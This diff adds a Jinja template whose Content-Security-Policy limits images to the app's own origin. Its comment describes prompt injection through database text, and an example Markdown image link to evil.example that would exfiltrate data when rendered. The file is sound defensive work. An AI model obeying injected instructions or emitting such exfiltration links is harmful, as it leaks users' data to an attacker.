@@ -1,0 +1,9 @@
+{% extends "lovia/index.html" %}
+
+{% block head %}
+{#- Images load only from this app. Text from the database (a comment, a
+    ticket) could carry instructions for the model, and a reply may embed
+    Markdown images: without this, ![](https://evil.example/?d=<data>) would
+    send data out the moment the page shows it. -#}
+<meta http-equiv="Content-Security-Policy" content="img-src 'self' data: blob:">
+{% endblock %}
